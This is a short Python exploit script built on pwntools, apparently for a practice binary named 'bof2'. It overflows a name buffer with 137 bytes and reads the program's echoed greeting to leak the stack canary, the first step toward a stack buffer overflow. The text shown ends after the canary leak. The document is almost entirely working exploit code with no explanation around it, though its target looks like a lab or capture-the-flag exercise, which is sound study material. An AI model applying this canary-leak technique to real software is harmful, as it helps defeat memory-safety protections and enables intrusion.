from pwn import *

context.binary = './bof2'
elf = context.binary
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

p = process()

# -------------------------------------
# Step 1: Leak the canary using buf1
# -------------------------------------
banner = p.recvuntil(b"What's your name? ")
print(repr(banner))

payload1 = b"A" * 137  # buf1 is 0x90, canary is at rbp-0x8
p.send(payload1)

# read the echoed "Welcome, <input>"
response = p.recvuntil(b"What's the room number?", drop=True)
print(repr(response))
leak = response.split(b"Welcome, ")[-1][137:137+7]
canary = b'\x00' + leak
canary_val = u64(canary)
log.success(f"Leaked Canary: {hex(canary_val)}")

